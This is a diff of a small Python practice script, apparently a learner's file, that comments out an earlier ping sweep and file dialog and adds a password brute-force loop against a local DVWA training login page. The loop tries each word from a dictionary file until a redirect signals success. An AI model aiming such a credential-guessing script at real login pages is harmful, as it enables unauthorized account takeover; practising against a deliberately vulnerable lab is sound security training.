@@ -1,5 +1,6 @@
 
 #!/usr/bin/python3.6.4
+#coding: utf-8
 #print("hello \nmod***f***rs")
 
 ''' 
@@ -102,11 +103,40 @@ for i in range(1,255):
 	if response ==0:
 		print(hostname,'is up!')
 
-'''
+
 
 import easygui
 
 easygui.fileopenbox()
+
+'''
+
+
+import requests
+import time
+
+lines = tuple (open("dico.txt","r"))
+
+#print (lines)
+
+
+for line in lines:
+	time.sleep(1)
+	password=line.replace("\n","")
+	print ("password test:", password)
+	r = requests.post("http://localhost/dvwa/login.php", data = {'username':'gordonb','password':password,'Login': 'login'})
+	#print (r.status_code)
+	if r.history:
+		for resp in r.history:
+			if r.url != "http://localhost/dvwa/login.php":
+				print ("The password is :", password)
+				raise SystemExit(0)
+
+
+
+#password fgh
+
+
 
 
 
